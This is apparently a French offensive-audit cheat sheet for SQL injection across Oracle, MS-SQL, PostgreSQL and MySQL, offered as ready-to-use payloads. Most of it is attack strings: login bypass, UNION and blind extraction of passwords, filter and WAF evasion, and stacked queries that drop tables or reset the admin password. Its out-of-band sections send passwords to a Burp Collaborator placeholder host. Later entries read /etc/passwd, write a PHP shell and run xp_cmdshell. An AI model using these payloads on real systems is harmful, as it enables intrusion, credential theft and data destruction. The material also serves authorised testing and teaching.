---
title: "Aide-mémoire : Injection SQL (SQLi Cheat Sheet)"
description: "Cheat sheet SQLi complet : concaténation, sous-chaînes, commentaires, contournement de filtres, fingerprinting, énumération, erreurs conditionnelles, error-based, requêtes empilées, time-based et OOB, pour Oracle, MS-SQL, PostgreSQL et MySQL."
tags:
  - sqli
  - cheat-sheet
  - web-security
  - red-team
  - database
---

# 💉 Aide-mémoire : Injection SQL (SQLi Cheat Sheet)

!!! note "Utilisation de cette fiche"
    Cette fiche synthétise les syntaxes SQL équivalentes entre les quatre principaux SGBD (Oracle, Microsoft SQL Server, PostgreSQL, MySQL) pour un usage rapide en contexte d'audit offensif. Elle complète la fiche théorique [`sqli.md`](sqli.md) consacrée à la méthodologie de détection et de remédiation.

---

## 0. Workflow de décision — identification de la faille

!!! note "Principe"
    Tester dans l'ordre. Dès qu'un test est concluant, arrêter cette étape et passer à l'exploitation correspondante (voir section 12).

**Étape 1 — Casser la syntaxe :**

```sql
'
```

- → Erreur SQL brute affichée (`Unclosed quotation mark...`, `You have an error in your SQL syntax...`) : **In-Band / Error-Based exploitable** → aller en 12.13.
- → `HTTP 500` sans détail, ou page blanche/cassée : syntaxe cassée confirmée mais message masqué → passer à l'étape 2 pour qualifier le type de Blind.
- → Aucun changement, page normale : soit paramétré/échappé, soit paramètre non réfléchi dans une requête SQL → tester `''` pour confirmer :
  ```sql
  ''
  ```
  - → page redevient normale avec `''` : confirme bien un contexte SQL string, mais correctement échappé pour l'apostrophe simple → tester filtres/encodage (étape 5) avant de conclure "non vulnérable".
  - → aucun changement même avec `''` : probablement non injectable sur ce paramètre par ce vecteur, tester un autre paramètre/en-tête.

**Étape 2 — Tester une condition VRAIE vs FAUSSE (contenu de la réponse) :**

```sql
' OR '1'='1
' AND '1'='2
```

- → contenu différent entre les deux (plus/moins de résultats, texte présent/absent) : **Boolean-Based Blind exploitable** → aller en 12.11.
- → contenu strictement identique dans les deux cas : passer à l'étape 3.

**Étape 3 — Tester le code de statut HTTP conditionnel :**

```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)=1--
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END)=1--
```

- → `HTTP 500` sur la 1ʳᵉ, `HTTP 200` sur la 2ᵉ : **erreurs conditionnelles exploitables** → aller en 12.12.
- → statut identique dans les deux cas : passer à l'étape 4.

**Étape 4 — Tester le délai de réponse :**

```sql
' AND SLEEP(5)--       -- adapter la syntaxe au SGBD si déjà identifié (12.14)
```

- → réponse retardée de ~5s de façon reproductible : **Time-Based Blind exploitable** → aller en 12.15.
- → aucun délai observé : passer à l'étape 5.

**Étape 5 — Suspicion de filtre/WAF :**

```sql
SeLeCT 1
SELECT/**/1
```

- → requête en clair bloquée (`403`) mais variante obfusquée passe : **filtre contournable** → aller en 12.18/12.19/12.20, puis reprendre l'étape 1.
- → toujours bloqué quelle que soit la variante : filtrage robuste sur ce vecteur, tester un autre paramètre/en-tête (12.24) ou un autre point d'entrée (formulaire relisant une donnée stockée → 12.21).

**Étape 6 — Aucun signal exploitable (pas d'erreur, pas de diff de contenu, pas de délai, pas de filtre à contourner) :**

- → tester une interaction Out-of-Band (nécessite un serveur d'écoute externe type Burp Collaborator) :
  ```sql
  -- MSSQL
  '; exec master..xp_dirtree '//SUBDOMAIN.burpcollaborator.net/a'--
  ```
  - → interaction DNS/HTTP reçue sur le serveur d'écoute : **OAST exploitable** → aller en 12.16/12.17.
  - → aucune interaction reçue : le SGBD ne dispose probablement pas des privilèges/fonctions réseau nécessaires, ou le paramètre n'est réellement pas injectable → conclure "non exploitable par SQLi sur ce vecteur" et passer au paramètre suivant.

---

## 1. Concaténation de chaînes (String Concatenation)

| SGBD | Syntaxe |
|---|---|
| **Oracle** | `'foo'\|\|'bar'` |
| **Microsoft** | `'foo'+'bar'` |
| **PostgreSQL** | `'foo'\|\|'bar'` |
| **MySQL** | `'foo' 'bar'` (espace) ou `CONCAT('foo','bar')` |

```sql
-- Oracle
SELECT 'foo'||'bar' FROM dual;

-- Microsoft SQL Server
SELECT 'foo'+'bar';

-- PostgreSQL
SELECT 'foo'||'bar';

-- MySQL
SELECT 'foo' 'bar';
SELECT CONCAT('foo','bar');
```

!!! tip "Particularité MySQL"
    MySQL est le seul des quatre SGBD à ne pas utiliser `||` par défaut (ce comportement dépend du mode SQL `PIPES_AS_CONCAT`). La fonction `CONCAT()` est la syntaxe la plus fiable et portable.

---

## 2. Extraction de sous-chaînes (Substring)

Exemple : extraire `"ba"` depuis `"foobar"` (offset 4, longueur 2, index basé sur 1).

| SGBD | Syntaxe |
|---|---|
| **Oracle** | `SUBSTR('foobar', 4, 2)` |
| **Microsoft** | `SUBSTRING('foobar', 4, 2)` |
| **PostgreSQL** | `SUBSTRING('foobar', 4, 2)` |
| **MySQL** | `SUBSTRING('foobar', 4, 2)` |

```sql
-- Oracle
SELECT SUBSTR('foobar', 4, 2) FROM dual; -- 'ba'

-- Microsoft SQL Server
SELECT SUBSTRING('foobar', 4, 2); -- 'ba'

-- PostgreSQL
SELECT SUBSTRING('foobar', 4, 2); -- 'ba'

-- MySQL
SELECT SUBSTRING('foobar', 4, 2); -- 'ba'
```

!!! tip "Usage typique en Blind SQLi"
    Cette fonction est la brique de base de toute extraction caractère par caractère en Boolean-Based ou Time-Based Blind SQLi : on itère l'offset de `1` à `N` en testant chaque caractère possible.

---

## 3. Commentaires & Troncature de requêtes (Comments)

| SGBD | Syntaxe(s) |
|---|---|
| **Oracle** | `--comment` |
| **Microsoft** | `--comment` ou `/*comment*/` |
| **PostgreSQL** | `--comment` ou `/*comment*/` |
| **MySQL** | `#comment`, `-- comment` (espace requis), `/*comment*/` |

```sql
-- Oracle : commentaire simple ligne
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x';

-- Microsoft SQL Server
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x';
SELECT * FROM users WHERE username = 'admin'/*' AND password = 'x'*/;

-- PostgreSQL
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x';

-- MySQL
SELECT * FROM users WHERE username = 'admin'#' AND password = 'x';
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'x';
```

!!! warning "Espace obligatoire sous MySQL"
    Sous MySQL, la syntaxe `--` doit **impérativement** être suivie d'un espace (`-- `) pour être interprétée comme un commentaire. `admin'--` sans espace final échouera, alors que `admin'-- ` (avec espace) fonctionnera. L'alternative `#` ne souffre pas de cette contrainte.

---

## 4. Contournement de filtres (Bypassing Filters)

!!! warning "Contexte d'application"
    Ces techniques visent à contourner des filtres ou WAF basés sur la détection de mots-clés (blacklist), et non des mécanismes de paramétrage stricts (requêtes préparées), qui restent la seule contre-mesure fiable.

**Casse alternative :**

```sql
SeLeCT username FrOm users;
```

**Commentaires en ligne en lieu et place des espaces (technique MySQL) :**

```sql
SELECT/**/username/**/FROM/**/users;
```

**Commentaires versionnés (spécifiques MySQL) :**

```sql
/*!SELECT*/ username FROM users;
/*!50000SELECT*/ username FROM users;
```

!!! tip "Commentaires versionnés MySQL"
    La syntaxe `/*!CODE*/` fait exécuter le contenu par MySQL comme du SQL normal (le contenu est ignoré par les autres SGBD, qui le traitent comme un commentaire classique). La variante `/*!50000CODE*/` restreint l'exécution aux versions de MySQL supérieures ou égales à `5.00.00`, ce qui peut suffire à contourner certains filtres ne reconnaissant pas cette syntaxe.

---

## 5. Identification du SGBD & Version (Database Version)

| SGBD | Requête |
|---|---|
| **Oracle** | `SELECT banner FROM v$version` ou `SELECT version FROM v$instance` |
| **Microsoft** | `SELECT @@version` |
| **PostgreSQL** | `SELECT version()` |
| **MySQL** | `SELECT @@version` |

```sql
-- Oracle
SELECT banner FROM v$version;
SELECT version FROM v$instance;

-- Microsoft SQL Server
SELECT @@version;

-- PostgreSQL
SELECT version();

-- MySQL
SELECT @@version;
```

---

## 6. Énumération du contenu de la base (Database Contents)

| SGBD | Tables | Colonnes |
|---|---|---|
| **Oracle** | `SELECT * FROM all_tables` | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'` |
| **Microsoft / PostgreSQL / MySQL** | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |

```sql
-- Oracle
SELECT * FROM all_tables;
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME';

-- Microsoft SQL Server / PostgreSQL / MySQL
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME';
```

!!! note "Casse des identifiants sous Oracle"
    Sous Oracle, les noms de tables et de colonnes sont par convention stockés et retournés en **MAJUSCULES** (`'TABLE-NAME'` doit généralement être fourni en majuscules, sauf si l'objet a été créé avec des guillemets doubles préservant la casse).

---

## 7. Erreurs conditionnelles (Conditional Errors)

Technique consistant à forcer une erreur logique (division par zéro, conversion invalide) **uniquement** lorsque la condition testée est vraie, permettant une extraction Blind Booléenne via le code de statut HTTP.

```sql
-- Oracle
SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual;

-- Microsoft SQL Server
SELECT CASE WHEN (CONDITION) THEN 1/0 ELSE NULL END;

-- PostgreSQL
SELECT 1 = (SELECT CASE WHEN (CONDITION) THEN 1/(SELECT 0) ELSE NULL END);

-- MySQL
SELECT IF(CONDITION,(SELECT table_name FROM information_schema.tables),'a');
```

!!! tip "Principe commun"
    Remplacer `CONDITION` par le test booléen à évaluer (ex : `(SELECT COUNT(*) FROM users)>0`). Si `CONDITION` est vraie, une erreur SQL est déclenchée et remonte généralement en `HTTP 500` ; sinon, la requête s'exécute normalement en `HTTP 200`.

---

## 8. Exfiltration par messages d'erreur visibles (Error-based SQLi)

Ces techniques provoquent une erreur de conversion ou de syntaxe qui **fait fuiter la donnée recherchée directement dans le message d'erreur** renvoyé par l'application.

```sql
-- Microsoft SQL Server (erreur de comparaison de types)
SELECT 'foo' WHERE 1 = (SELECT 'secret');

-- PostgreSQL (erreur de conversion de type)
SELECT CAST((SELECT password FROM users LIMIT 1) AS int);

-- MySQL (via EXTRACTVALUE, exploitation d'une erreur XPath)
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')));
```

!!! danger "Impact"
    Cette classe de technique est particulièrement efficace car elle permet une exfiltration **en une seule requête**, sans itération caractère par caractère, à condition que l'application affiche les messages d'erreur SQL bruts au client — ce qui constitue en soi une mauvaise pratique de configuration à corriger.

---

## 9. Requêtes empilées / multiples (Batched/Stacked Queries)

Technique consistant à faire exécuter plusieurs requêtes SQL successives séparées par un point-virgule (`;`) au sein d'une seule injection.

| SGBD | Support des requêtes empilées |
|---|---|
| **Oracle** | ❌ Non supporté nativement |
| **Microsoft SQL Server** | ✅ Supporté nativement |
| **PostgreSQL** | ✅ Supporté nativement |
| **MySQL** | ⚠️ Dépend exclusivement de l'API cliente utilisée (PHP/Python) |

```sql
-- Exemple générique de requête empilée (MS-SQL / PostgreSQL)
SELECT * FROM products WHERE id = 1; DROP TABLE logs;--
```

!!! warning "Cas MySQL"
    MySQL ne supporte les requêtes empilées **que si l'API cliente le permet explicitement** (par exemple certaines configurations de PDO en PHP ou de connecteurs Python autorisant le `multi-statement`). La plupart des connecteurs standards désactivent ce comportement par défaut, rendant le stacked-query souvent impraticable sous MySQL en conditions réelles.

---

## 10. Temporisation & Délais temporels (Time Delays)

### 10.1 Inconditionnels

| SGBD | Syntaxe |
|---|---|
| **Oracle** | `dbms_pipe.receive_message(('a'),10)` |
| **Microsoft** | `WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT pg_sleep(10)` |
| **MySQL** | `SELECT SLEEP(10)` |

```sql
-- Oracle
SELECT dbms_pipe.receive_message(('a'),10) FROM dual;

-- Microsoft SQL Server
WAITFOR DELAY '0:0:10';

-- PostgreSQL
SELECT pg_sleep(10);

-- MySQL
SELECT SLEEP(10);
```

### 10.2 Conditionnels

```sql
-- Oracle
SELECT CASE WHEN (CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual;

-- Microsoft SQL Server
IF (CONDITION) WAITFOR DELAY '0:0:10';

-- PostgreSQL
SELECT CASE WHEN (CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END;

-- MySQL
SELECT IF(CONDITION,SLEEP(10),'a');
```

!!! tip "Pourquoi toujours inclure une branche ELSE"
    Chaque syntaxe conditionnelle prévoit un cas `ELSE` sans délai (ou avec `pg_sleep(0)`), afin que la requête retourne rapidement lorsque la condition est fausse. Sans cette branche, une condition fausse pourrait produire un comportement ambigu et fausser la mesure du délai.

---

## 11. Requêtes Out-of-Band (OOB) via DNS Lookup & Exfiltration

!!! note "Contexte d'usage"
    Ces techniques sont réservées aux scénarios totalement aveugles où ni le canal de réponse ni le canal temporel ne sont exploitables. Elles nécessitent un serveur d'écoute externe (ex : Burp Collaborator) capable de journaliser les requêtes DNS/HTTP entrantes.

### 11.1 DNS Lookup simple

```sql
-- Oracle : via XXE (xmltype)
SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SUBDOMAIN/"> %remote; ]>') FROM dual;

-- Oracle : via UTL_INADDR (alternative sans privilège XXE)
SELECT UTL_INADDR.get_host_address('SUBDOMAIN') FROM dual;

-- Microsoft SQL Server
exec master..xp_dirtree '//SUBDOMAIN/a';

-- PostgreSQL
copy (SELECT '') to program 'nslookup SUBDOMAIN';

-- MySQL (environnement Windows uniquement)
SELECT LOAD_FILE('\\\\SUBDOMAIN\\a');
SELECT * FROM users INTO OUTFILE '\\\\SUBDOMAIN\\a';
```

!!! warning "Compatibilité MySQL OOB"
    Les techniques OOB sous MySQL via `LOAD_FILE()` ou `INTO OUTFILE` reposent sur l'interprétation par **Windows** d'un chemin UNC (`\\SUBDOMAIN\a`) comme une requête réseau SMB déclenchant une résolution DNS. Ces techniques sont **inopérantes sur un serveur MySQL hébergé sous Linux**, qui ne traite pas les chemins UNC de cette manière.

### 11.2 DNS Lookup avec exfiltration de données

Le principe est identique au lookup simple, à ceci près que le résultat d'une sous-requête est **concaténé directement dans le sous-domaine interrogé**, permettant sa réception en clair côté serveur d'écoute.

```sql
-- Oracle : exfiltration via UTL_INADDR
SELECT UTL_INADDR.get_host_address(
  (SELECT password FROM users WHERE ROWNUM=1) || '.SUBDOMAIN'
) FROM dual;

-- Microsoft SQL Server : exfiltration via xp_dirtree
declare @p varchar(1024);
select @p=(SELECT password FROM users WHERE username='administrator');
exec('master..xp_dirtree "//'+@p+'.SUBDOMAIN/a"');

-- PostgreSQL : exfiltration via program (nslookup)
copy (SELECT password FROM users LIMIT 1) to program 'nslookup $(cat).SUBDOMAIN';

-- MySQL (Windows) : exfiltration via LOAD_FILE
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.SUBDOMAIN\\a'));
```

!!! danger "Portée de l'exfiltration OOB"
    Cette classe de technique est la plus critique en matière d'impact : elle permet d'extraire des données sensibles **même sur une application totalement aveugle**, sans dépendre du rendu de la réponse HTTP ni du canal temporel, ce qui la rend indétectable par une simple observation de l'application côté client.

---

## 12. Scénarios types (par situation)

!!! note "Format"
    Payloads prêts à l'emploi par situation, génériques (Boutique/login classiques). Remplacer `TABLE`, `COLONNE`, `USERNAME` selon la cible.

### 12.1 WHERE clause — récupération de données cachées

- Neutraliser la fin de la condition :
  ```sql
  Gifts'--
  ```
- Étendre à toutes les lignes :
  ```sql
  Gifts' OR 1=1--
  ```

### 12.2 Login bypass

- Commenter le check du mot de passe :
  ```sql
  administrator'--
  administrator'-- (MySQL, espace final requis)
  administrator'#     (MySQL)
  ```
- Bypass sans connaître le login :
  ```sql
  ' OR 1=1--
  ' OR 1=1 LIMIT 1--   (MySQL/PostgreSQL)
  ```
- Sur le champ password directement :
  ```sql
  ' OR '1'='1
  ```

### 12.3 Version du SGBD — Oracle

```sql
' UNION SELECT banner, NULL FROM v$version--
' UNION SELECT version, NULL FROM v$instance--
```

### 12.4 Version du SGBD — MySQL / Microsoft

```sql
' UNION SELECT @@version, NULL--
```

### 12.5 Contenu de la base — non-Oracle

```sql
-- Lister les tables
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- Lister les colonnes d'une table
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='TABLE'--

-- Filtrer par schéma courant (MySQL)
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
```

### 12.6 Contenu de la base — Oracle

```sql
-- Lister les tables
' UNION SELECT table_name, NULL FROM all_tables--

-- Lister les colonnes (attention : noms en MAJUSCULES)
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='TABLE'--
```

### 12.7 UNION — nombre de colonnes

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- incrémenter jusqu'à erreur

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   -- incrémenter jusqu'à 200 OK

' UNION SELECT NULL,NULL,NULL FROM DUAL--   -- Oracle (FROM DUAL obligatoire)
```

### 12.8 UNION — trouver une colonne texte

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### 12.9 UNION — extraction depuis une autre table

```sql
' UNION SELECT username, password FROM users--
' UNION SELECT NULL, username, password FROM users--   -- si 3 colonnes
```

### 12.10 UNION — plusieurs valeurs dans une seule colonne

```sql
' UNION SELECT username || ':' || password, NULL FROM users--     -- Oracle/PostgreSQL
' UNION SELECT username+':'+password, NULL FROM users--            -- MSSQL
' UNION SELECT CONCAT(username,':',password), NULL FROM users--    -- MySQL
```

### 12.11 Blind — réponses conditionnelles (Boolean-Based)

```sql
-- Validation
' AND '1'='1
' AND '1'='2

-- Longueur d'une donnée
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=20--

-- Extraction caractère par caractère
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

### 12.12 Blind — erreurs conditionnelles

```sql
-- Oracle
' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL--

-- MSSQL
' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1/0 ELSE NULL END)=1--

-- PostgreSQL
' AND 1=(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1/(SELECT 0) ELSE NULL END)--

-- MySQL
' AND IF((SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'),(SELECT table_name FROM information_schema.tables),'a')--
```

### 12.13 Error-based visible (extraction directe)

```sql
-- MSSQL
' AND 1=(SELECT 'a' WHERE 1=1 UNION SELECT password FROM users)--
' AND CAST((SELECT password FROM users WHERE username='admin') AS int)=1--

-- PostgreSQL
' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--

-- MySQL (XPath)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--
' AND updatexml(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)), 1)--
```

### 12.14 Blind — délais temporels (détection)

```sql
' AND SLEEP(5)--                    -- MySQL/MariaDB
'; WAITFOR DELAY '0:0:5'--          -- MSSQL
' AND pg_sleep(5)--                 -- PostgreSQL
' AND dbms_pipe.receive_message(('a'),5) IS NULL--  -- Oracle
```

### 12.15 Blind — délais temporels + extraction

```sql
-- MySQL
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
'; IF ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
'; SELECT CASE WHEN ((SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a') THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual--
```

### 12.16 Blind — interaction Out-of-Band (détection)

```sql
-- MSSQL
'; exec master..xp_dirtree '//SUBDOMAIN.burpcollaborator.net/a'--

-- Oracle
SELECT UTL_INADDR.get_host_address('SUBDOMAIN.burpcollaborator.net') FROM dual;
SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SUBDOMAIN.burpcollaborator.net/"> %remote;]>') FROM dual;

-- PostgreSQL
copy (SELECT '') to program 'nslookup SUBDOMAIN.burpcollaborator.net';

-- MySQL (Windows uniquement)
SELECT LOAD_FILE('\\\\SUBDOMAIN.burpcollaborator.net\\a');
```

### 12.17 Blind — exfiltration Out-of-Band

```sql
-- MSSQL
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='administrator');
exec('master..xp_dirtree "//'+@p+'.SUBDOMAIN.burpcollaborator.net/a"')--

-- Oracle
SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE ROWNUM=1)||'.SUBDOMAIN.burpcollaborator.net') FROM dual;

-- PostgreSQL
copy (SELECT password FROM users LIMIT 1) to program 'nslookup $(cat).SUBDOMAIN.burpcollaborator.net';

-- MySQL (Windows)
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.SUBDOMAIN.burpcollaborator.net\\a'));
```

### 12.18 Filter bypass via encodage XML

```xml
<storeId>999 &#x55;NION &#x53;ELECT username, password FROM users</storeId>
```

### 12.19 Filter bypass via encodage Unicode JSON

```json
{ "storeId": "999 \u0055NION \u0053ELECT username, password FROM users" }
```

### 12.20 Filter bypass — mots-clés

```sql
SeLeCT username FrOm users;
SELECT/**/username/**/FROM/**/users;
/*!SELECT*/ username FROM users;
/*!50000SELECT*/ username FROM users;
%53ELECT username FROM users;      -- encodage URL
SELWHERECT username FRWHEREOM users; -- double mot-clé filtré (si remplacement naïf)
```

### 12.21 Second-order SQLi

```sql
-- Phase 1 : stockage (paramétré, aucune alerte)
display_name = administrator'--

-- Phase 2 : requête reconstruite dynamiquement plus tard
UPDATE users SET password = 'hacked123' WHERE username = 'administrator'--'
```

### 12.22 Requêtes empilées (Stacked Queries)

```sql
'; DROP TABLE logs--                          -- MSSQL / PostgreSQL
'; INSERT INTO users (username,password) VALUES ('hacker','pwd')--
'; UPDATE users SET password='pwn3d' WHERE username='admin'--
```

### 12.23 Extraction de fichiers (lecture/écriture, si privilèges)

```sql
-- MySQL
SELECT LOAD_FILE('/etc/passwd');
SELECT 'shell' INTO OUTFILE '/var/www/html/shell.php';

-- MSSQL
EXEC xp_cmdshell 'whoami';

-- PostgreSQL
CREATE TABLE tmp(data text);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;
```

### 12.24 En-têtes HTTP comme vecteur

```http
User-Agent: ' OR 1=1--
Referer: ' OR 1=1--
X-Forwarded-For: ' OR 1=1--
Cookie: TrackingId=xyz' OR '1'='1
```

---

!!! note "Voir aussi"
    Pour la méthodologie complète de détection (in-band, blind, OAST), les techniques UNION-based, le second-order SQLi et les contre-mesures détaillées (requêtes préparées, whitelisting), se référer à la fiche [`sqli.md`](sqli.md).
